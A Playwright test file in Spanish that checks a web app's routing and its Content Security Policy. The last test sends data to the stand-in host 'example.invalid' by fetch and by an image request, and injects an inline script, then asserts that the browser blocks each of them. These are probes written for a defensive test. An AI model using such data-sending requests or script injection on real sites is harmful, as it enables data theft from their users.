import { test as bare } from '@playwright/test'
import { expect, test } from './support'

test('una dirección interior se abre directamente, como en GitHub Pages', async ({ page }) => {
  await page.goto('./calendario')
  await expect(page.getByRole('heading', { name: 'Calendario', level: 1 }).filter({ visible: true })).toBeVisible()
})

test('una dirección que no existe lo dice', async ({ page }) => {
  await page.goto('./no-existe')
  await expect(page).toHaveTitle(/no existe/i)
})

// Sin la comprobación común: aquí los bloqueos son lo esperado.
bare('el navegador impide enviar datos a otro sitio', async ({ page }) => {
  await page.goto('./')
  // Se mira el bloqueo, no el error: sin conexión también fallaría.
  const blocked = await page.evaluate(async () => {
    const found: string[] = []
    document.addEventListener('securitypolicyviolation', (event) => found.push(event.effectiveDirective))
    await fetch('https://example.invalid/?dato=1').catch(() => undefined)
    new Image().src = 'https://example.invalid/?dato=1'
    const script = document.createElement('script')
    script.textContent = 'window.colado = true'
    document.head.append(script)
    await new Promise((done) => { setTimeout(done, 300) })
    return { found, ran: 'colado' in window }
  })
  expect(blocked.found).toEqual(expect.arrayContaining(['connect-src', 'img-src', 'script-src-elem']))
  expect(blocked.ran).toBe(false)
})
